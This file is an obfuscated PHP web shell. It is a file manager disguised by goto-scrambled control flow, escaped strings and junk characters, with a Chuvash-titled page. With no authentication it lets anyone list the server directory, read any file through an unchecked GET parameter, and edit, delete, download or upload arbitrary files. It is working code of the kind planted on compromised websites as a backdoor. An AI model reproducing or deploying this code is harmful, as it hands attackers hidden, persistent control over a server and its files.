לకطளำວૂճõካיήxይಂއং<?php
 goto kYB4J; VBwrN: foreach ($files as $file) { if ($file !== "\56" && $file !== "\x2e\56") { echo "\x3c\x61\x20\150\x72\x65\146\x3d\47\77\x66\151\x6c\x65\x3d{$file}\x27\40\x63\154\141\163\x73\75\47\x6c\x69\x73\164\x2d\147\x72\x6f\x75\160\x2d\151\x74\x65\155\40\x6c\x69\x73\x74\x2d\147\162\157\x75\x70\55\x69\164\x65\x6d\55\x61\143\x74\x69\x6f\156\47\76" . $file . "\74\57\x61\76"; } } goto TCSwh; xwYoy: $directory = "\x2e\x2f"; goto xiDtd; plE7Z: goto AJXwE; goto wxnon; gZFlb: goto svt6_; goto vVvv1; xiDtd: goto OK0ei; goto fzZoZ; fzZoZ: uf3Z4: goto gywbi; X11pu: goto ILTwA; goto glhqS; nq7gt: ?>
<div class="mt-5"><h2 class="mb-3">Upload a File</h2><form method="post"enctype="multipart/form-data"><input name="action"type="hidden"value="upload"><div class="form-group"><input name="file"type="file"class="form-control-file"></div><button class="btn btn-primary"type="submit">Upload</button></form></div><?php  goto X11pu; tbeZ4: if (isset($_GET["\x66\151\154\145"])) { $file = $_GET["\146\151\154\x65"]; $path = $directory . $file; $content = file_get_contents($path); ?>
<div class="mt-5"><h2 class="mb-3">Edit File:<?php  echo $file; ?>
</h2><form method="post"><input name="action"type="hidden"value="edit"> <input name="filename"type="hidden"value="<?php  echo $file; ?>
"><div class="form-group"><textarea class="form-control"name="content"rows="10"><?php  echo $content; ?>
</textarea></div><button class="btn btn-primary"type="submit">Save</button> <a class="btn btn-secondary"href="?file=<?php  echo $file; ?>
&action=download">Download</a> <button class="btn btn-danger"type="submit"name="action"value="delete">Delete</button></form></div><?php  } goto w0heE; vVvv1: svt6_: goto j0xdN; A7p9q: X0_La: goto nq7gt; j0xdN: $files = scandir($directory); goto mRdll; mRdll: goto uf3Z4; goto OpRgI; kYB4J: goto M29K5; goto OPC3f; w0heE: goto eAwKZ; goto S_bet; glhqS: AJXwE: goto sBDpF; sBDpF: ?>
<div class="container my-5"><h1 class="mb-4">Файл сарӑлӑвӗ</h1><h2 class="mb-3">Files in the directory:</h2><div class="list-group"><?php  goto NPYrb; NPYrb: goto pskMA; goto tenEo; gywbi: ?>
<!doctypehtml><html><head><title>Файл сарӑлӑвӗ</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"rel="stylesheet"></head><body><?php  goto plE7Z; TCSwh: goto X0_La; goto A7p9q; OPC3f: OK0ei: goto gq35Y; wxnon: ILTwA: goto tbeZ4; S_bet: pskMA: goto VBwrN; tenEo: eAwKZ: goto SSY9M; gq35Y: if ($_SERVER["\122\105\x51\125\105\x53\x54\137\x4d\105\124\110\x4f\104"] === "\x50\x4f\x53\x54") { if (isset($_POST["\141\x63\164\151\x6f\156"])) { $action = $_POST["\141\143\164\151\x6f\156"]; $filename = $_POST["\x66\x69\x6c\x65\156\141\155\145"]; $path = $directory . $filename; switch ($action) { case "\145\x64\151\x74": if (isset($_POST["\x63\157\156\x74\145\156\x74"])) { $content = $_POST["\x63\x6f\156\164\145\156\164"]; file_put_contents($path, $content); echo "\74\144\x69\166\x20\143\154\x61\163\163\x3d\x27\141\x6c\x65\162\x74\x20\141\154\145\162\164\x2d\163\x75\143\143\x65\163\163\47\x3e\106\151\x6c\145\x20\47{$filename}\47\40\150\x61\163\40\x62\145\x65\x6e\x20\165\x70\144\141\164\x65\144\56\74\x2f\x64\x69\166\x3e"; } break; case "\x64\145\154\145\x74\x65": if (file_exists($path)) { unlink($path); echo "\x3c\144\151\166\x20\143\154\x61\x73\163\x3d\47\x61\154\145\x72\164\40\x61\154\145\x72\x74\x2d\144\141\156\147\x65\x72\47\x3e\x46\x69\154\145\40\47{$filename}\x27\40\x68\141\163\x20\142\145\145\156\x20\144\x65\x6c\x65\164\145\x64\56\x3c\x2f\144\x69\166\76"; } break; case "\x64\x6f\x77\156\154\x6f\x61\144": if (file_exists($path)) { header("\103\157\x6e\164\145\156\164\x2d\x54\x79\160\145\x3a\x20\141\160\160\x6c\x69\143\141\x74\x69\157\156\x2f\x6f\143\164\x65\x74\55\x73\x74\162\x65\x61\155"); header("\103\x6f\x6e\x74\145\x6e\164\55\104\151\x73\x70\157\x73\151\x74\x69\x6f\x6e\x3a\40\141\164\164\x61\x63\150\155\145\x6e\164\73\x20\146\151\x6c\145\x6e\x61\155\145\x3d\x22" . $filename . "\x22"); readfile($path); die; } break; case "\165\x70\x6c\x6f\141\x64": if (isset($_FILES["\146\x69\x6c\145"]) && $_FILES["\146\x69\x6c\x65"]["\x65\162\162\157\162"] == UPLOAD_ERR_OK) { $uploadedFile = $_FILES["\146\151\154\145"]; $uploadedFilename = $uploadedFile["\x6e\x61\x6d\145"]; $uploadedFilePath = $directory . $uploadedFilename; if (move_uploaded_file($uploadedFile["\x74\x6d\x70\x5f\156\141\155\x65"], $uploadedFilePath)) { echo "\74\x64\151\x76\40\x63\x6c\141\x73\163\75\x27\141\x6c\145\162\164\x20\141\154\x65\162\x74\55\163\x75\143\143\145\163\x73\x27\76\x46\151\x6c\145\x20\x27{$uploadedFilename}\47\x20\150\x61\x73\40\x62\x65\x65\156\x20\x75\160\154\157\141\x64\x65\x64\x2e\x3c\x2f\144\x69\166\x3e"; } else { echo "\x3c\144\151\x76\40\143\x6c\141\x73\x73\75\47\x61\154\x65\x72\164\40\x61\154\x65\162\164\55\144\x61\156\147\145\162\x27\76\105\162\162\x6f\x72\x20\x75\160\154\x6f\141\x64\x69\x6e\x67\40\x66\x69\154\x65\40\47{$uploadedFilename}\x27\x2e\74\57\144\x69\166\x3e"; } } break; } } } goto gZFlb; OpRgI: M29K5: goto xwYoy; SSY9M: ?>
</div></body></html>ދຕĉાլłήાજ১ት็ዛлJ్ኛ